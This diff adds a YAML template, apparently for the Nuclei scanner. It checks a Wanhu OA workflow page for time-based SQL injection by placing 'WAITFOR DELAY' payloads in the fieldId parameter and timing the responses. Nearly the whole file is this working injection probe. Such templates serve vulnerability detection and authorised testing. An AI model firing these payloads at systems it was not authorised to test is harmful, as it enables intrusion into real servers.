@@ -1,0 +1,49 @@
+id: wanhu-wf_process_attrelate_aiframe-sqli
+
+info:
+  name: wanhu-wf_process_attrelate_aiframe-sqli
+  author: wanhu-wf_process_attrelate_aiframe-sqli
+
+
+requests:
+  - raw:
+      - |     
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+        
+
+      - |     
+        GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:3%27--%20FMZL HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+        
+        
+
+      - | 
+        @timeout: 20s
+        GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:6%27--%20FMZL HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |
+        @timeout: 20s  
+        GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:9%27--%20FMZL HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_2>=3  && duration_2<=6"
+          - "duration_3>=6  && duration_3<=9"
+          - "duration_4>=9  && duration_4<=12"
